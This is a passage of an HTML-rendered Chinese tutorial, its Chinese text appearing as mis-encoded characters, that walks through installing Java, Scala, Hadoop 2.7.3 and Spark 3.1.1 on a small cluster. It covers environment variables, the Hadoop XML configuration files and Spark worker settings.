variable">$JRE_HOME</span>/lib:<span class="token variable">$CLASSPATH</span><span class="token function">export</span> JAVA_PATH<span class="token operator">=</span><span class="token variable">$JAVA_HOME</span>/bin:<span class="token variable">$JRE_HOME</span>/bin<span class="token function">export</span> PATH<span class="token operator">=</span><span class="token variable">$PATH</span><span class="token keyword">:</span><span class="token variable">$JAVA_PATH</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ›´æ–°æ–‡ä»¶</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">source</span> /etc/profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æµ‹è¯•</p><pre class="line-numbers language-bash"><code class="language-bash">java -version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Scala"><a href="#Scala" class="headerlink" title="Scala"></a>Scala</h3><ol><li>ä¸‹è½½ Scala</li></ol><p>ä¸‹è½½åœ°å€ï¼š<a href="https://www.yuque.com/attachments/yuque/0/2021/gz/519483/1616420001231-2b0fa938-a732-4e2b-8037-8a4ca2a03fab.gz?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2021/gz/519483/1616420001231-2b0fa938-a732-4e2b-8037-8a4ca2a03fab.gz%22,%22name%22:%22scala-2.13.5.gz%22,%22size%22:23042641,%22type%22:%22%22,%22ext%22:%22gz%22,%22status%22:%22done%22,%22source%22:%22transfer%22,%22id%22:%22S2Ol0%22,%22card%22:%22file%22%7D">scala-2.13.5.gz</a></p><ol start="2"><li>è§£å‹</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> -zxvf scala-2.13.5.tgz -C /opt/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>é…ç½®ç¯å¢ƒå˜é‡</li></ol><p>ç¼–è¾‘**/etc/profile**ï¼Œæ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">export</span> SCALA_HOME<span class="token operator">=</span>/opt/scala-2.13.5<span class="token function">export</span> PATH<span class="token operator">=</span><span class="token variable">$SCALA_HOME</span>/bin:<span class="token variable">$PATH</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ›´æ–°æ–‡ä»¶</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">source</span> /etc/profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æµ‹è¯•</p><pre class="line-numbers language-bash"><code class="language-bash">scala -version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Hadoop"><a href="#Hadoop" class="headerlink" title="Hadoop"></a>Hadoop</h3><ol><li>ä¸‹è½½ Hadoop</li></ol><p>ä¸‹è½½åœ°å€ï¼š<a href="https://www.yuque.com/attachments/yuque/0/2021/gz/519483/1616420001410-cb5bfab5-e3b7-4941-9295-aa45770a6dc7.gz?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2021/gz/519483/1616420001410-cb5bfab5-e3b7-4941-9295-aa45770a6dc7.gz%22,%22name%22:%22hadoop-2.7.3.tar.gz%22,%22size%22:214092195,%22type%22:%22%22,%22ext%22:%22gz%22,%22status%22:%22done%22,%22source%22:%22transfer%22,%22id%22:%22tL82Q%22,%22card%22:%22file%22%7D">hadoop-2.7.3.tar.gz</a></p><ol start="2"><li>è§£å‹</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> -zxvf hadoop-2.7.3.tgz.gz -C /opt/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>é…ç½®ç¯å¢ƒå˜é‡</li></ol><p>ç¼–è¾‘**/etc/profile**ï¼Œæ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">export</span> HADOOP_HOME<span class="token operator">=</span>/opt/hadoop-2.7.3<span class="token function">export</span> PATH<span class="token operator">=</span><span class="token variable">$HADOOP_HOME</span>/bin:<span class="token variable">$HADOOP_HOME</span>/sbin:<span class="token variable">$PATH</span><span class="token function">export</span> HADOOP_CONF_DIR<span class="token operator">=</span><span class="token variable">$HADOOP_HOME</span>/etc/hadoop<span class="token function">export</span> YARN_CONF_DIR<span class="token operator">=</span><span class="token variable">$HADOOP_HOME</span>/etc/hadoop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>æ·»åŠ æ–‡ä»¶å¤¹</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mkdir</span> <span class="token variable">$HADOOP_HOME</span>/tmp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>ä¿®æ”¹**$HADOOP_HOME/etc/hadoop/slaves**ä¸ºï¼š</li></ol><pre class="line-numbers language-scala"><code class="language-scala">spark1spark2spark3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="5"><li>ä¿®æ”¹**$HADOOP_HOME/etc/hadoop/core-site.xml**ä¸ºï¼š</li></ol><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token prolog">&lt;?xml-stylesheet type="text/xsl" href="configuration.xsl"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hadoop.tmp.dir<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>file:/opt/hadoop-2.7.3/tmp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">></span></span>Abase for other temporary directories.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>fs.defaultFS<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>hdfs://spark0:9000<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>io.file.buffer.size<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>131072<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="6"><li>ä¿®æ”¹**$HADOOP_HOME/etc/hadoop/hdfs-site.xml**ä¸ºï¼š</li></ol><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token prolog">&lt;?xml-stylesheet type="text/xsl" href="configuration.xsl"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>dfs.http.address<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>spark0:50070<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">></span></span>The address and the base port where the dfs namenode web ui will listen on.If the port is 0 then the server will start on a free port.    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>dfs.namenode.secondary.http-address<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>spark0:50090<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>dfs.namenode.name.dir<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>/opt/hadoop-2.7.3/hdfs/name<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>dfs.datanode.data.dir<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>/opt/hadoop-2.7.3/hdfs/data<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>dfs.replication<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>dfs.webhdfs.enabled<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="7"><li>ä¿®æ”¹**$HADOOP_HOME/etc/hadoop/yarn-site.xml**ä¸ºï¼š</li></ol><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token prolog">&lt;?xml-stylesheet type="text/xsl" href="configuration.xsl"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- Site specific YARN configuration properties --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.resourcemanager.hostname<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>spark0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.nodemanager.aux-services<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>mapreduce_shuffle<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.resourcemanager.address<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>spark0:8032<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.resourcemanager.scheduler.address<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>spark0:8030<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.resourcemanager.resource-tracker.address<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>spark0:8031<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.resourcemanager.admin.address<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>spark0:8033<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.resourcemanager.webapp.address<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>spark0:8088<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="8"><li>ä¿®æ”¹**$HADOOP_HOME/etc/hadoop/mapred-site.xml**ä¸ºï¼š</li></ol><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token prolog">&lt;?xml-stylesheet type="text/xsl" href="configuration.xsl"?></span><span class="token comment" spellcheck="true">&lt;!-- Put site-specific property overrides in this file. --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>mapreduce.framework.name<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>yarn<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>final</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>final</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>mapreduce.jobtracker.http.address<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>spark0:50030<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>mapreduce.jobhistory.address<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>spark0:10020<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>mapreduce.jobhistory.webapp.address<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>spark0:19888<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>mapred.job.tracker<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>http://spark0:9001<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="9"><li>ä¿®æ”¹**$HADOOP_HOME/etc/hadoop/hadoop-env.sh<strong>çš„</strong>JAVA_HOME**</li></ol><pre class="line-numbers language-xml"><code class="language-xml">export JAVA_HOME=/opt/jdk1.8.0_281<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="10"><li>æ ¼å¼åŒ– <strong>namenode</strong></li></ol><pre class="line-numbers language-bash"><code class="language-bash">hadoop namenode -format<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>å‡ºç° Exitting with status 0 è¡¨ç¤ºæˆåŠŸï¼Œè‹¥ä¸º Exitting with status 1 åˆ™æ˜¯å‡ºé”™</p></blockquote><h3 id="Spark"><a href="#Spark" class="headerlink" title="Spark"></a>Spark</h3><ol><li>ä¸‹è½½ Spark</li></ol><p>ä¸‹è½½åœ°å€ï¼š<a href="https://www.yuque.com/attachments/yuque/0/2021/gz/519483/1616420001613-e62f9c8f-59ed-4910-b181-7904152d962d.gz?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2021/gz/519483/1616420001613-e62f9c8f-59ed-4910-b181-7904152d962d.gz%22,%22name%22:%22spark-3.1.1-bin-hadoop2.7.gz%22,%22size%22:224374704,%22type%22:%22%22,%22ext%22:%22gz%22,%22status%22:%22done%22,%22source%22:%22transfer%22,%22id%22:%22ypySx%22,%22card%22:%22file%22%7D">spark-3.1.1-bin-hadoop2.7.gz</a></p><ol start="2"><li>è§£å‹</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> -zxvf spark-3.1.1-bin-hadoop2.7.tgz -C /opt/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>é…ç½®ç¯å¢ƒå˜é‡</li></ol><p>ç¼–è¾‘**/etc/profile**ï¼Œæ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">export</span> SPARK_HOME<span class="token operator">=</span>/opt/spark-3.1.1-bin-hadoop2.7<span class="token function">export</span> PATH<span class="token operator">=</span><span class="token variable">$PATH</span><span class="token keyword">:</span><span class="token variable">$SPARK_HOME</span>/bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ›´æ–°æ–‡ä»¶</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">source</span> /etc/profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>é…ç½®<strong>spark-env.sh</strong>æ–‡ä»¶</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /opt/spark-3.1.1-bin-hadoop2.7/conf<span class="token function">cp</span> spark-env.sh.template spark-env.shvim spark-env.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">export</span> JAVA_HOME<span class="token operator">=</span>/opt/jdk1.8.0_281<span class="token function">export</span> HADOOP_HOME<span class="token operator">=</span>/opt/hadoop-2.7.3<span class="token function">export</span> SCALA_HOME<span class="token operator">=</span>/opt/scala-2.13.5<span class="token function">export</span> SPARK_MASTER_IP<span class="token operator">=</span>spark0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="5"><li>é…ç½®<strong>workers</strong>æ–‡ä»¶</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /opt/spark-3.1.1-bin-hadoop2.7/conf<span class="token function">cp</span> workers.template workersvim workers<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">spark0spark1spark2spark3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å››ã€Spark1-3-é…ç½®"><a href="#å››ã€Spark1-3-é…ç½®" class="headerlink" title="å››ã€Spark1-3 é…ç½®"></a>å››ã€Spark1-3 é…ç½®</h2><h3 id="æ–‡ä»¶æ‹·è´ï¼ˆåœ¨-Spark0-ä¸Šæ“ä½œï¼‰"><a href="#æ–‡ä»¶æ‹·è´ï¼ˆåœ¨-Spark0-ä¸Šæ“ä½œï¼‰" class="headerlink" title="æ–‡ä»¶æ‹·è´ï¼ˆåœ¨ Spark0 ä¸Šæ“ä½œï¼‰"></a>æ–‡ä»¶æ‹·è´ï¼ˆåœ¨ Spark0 ä¸Šæ“ä½œï¼‰</h3><ol><li>æ‹·è´**/opt/**ç›®å½•</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">scp</span> -r /opt/ root@spark1:/<span class="token function">scp</span> -r /opt/ root@spark2:/<span class="token function">scp</span> -r /opt/ root@spark3:/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="2"><li>æ‹·è´**/etc/profile**æ–‡ä»¶</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">scp</span> /etc/profile root@spark1:/etc/<span class="token function">scp</span> /etc/profile root@spark2:/etc/<span class="token function">scp</span> /etc/profile root@spark3:/etc/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="ä¿®æ”¹-SPARK-LOCAL-IPï¼ˆåœ¨-spark1-3-ä¸Šæ“ä½œï¼‰"><a href="#ä¿®æ”¹-SPARK-LOCAL-IPï¼ˆåœ¨-spark1-3-ä¸Šæ“ä½œï¼‰" class="headerlink" title="ä¿®æ”¹ SPARK_LOCAL_IPï¼ˆåœ¨ spark1-3 ä¸Šæ“ä½œï¼‰"></a>ä¿®æ”¹ SPARK_LOCAL_IPï¼ˆåœ¨ spark1-3 ä¸Šæ“ä½œï¼‰</h3><ol><li>åˆ·æ–°**/etc/profile**</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">source</span> /etc/profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>æ”¹<strong>SPARK_LOCAL_IP</strong></li></ol><pre class="line-numbers language-bash"><code class="language-bash">vim <span class="token variable">$SPARK_HOME</span>/conf/spark-env.sh<span class="token comment" spellcheck="true"># æŠŠæœ€åä¸€è¡Œçš„spark0åˆ†åˆ«ä¿®æ”¹ä¸ºspark1ã€spark2ã€spark3</span><span class="token function">export</span> SPARK_MASTER_HOST<span class="token operator">=</span>spark1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="äº”ã€å¯åŠ¨-åœæ­¢é›†ç¾¤"><a 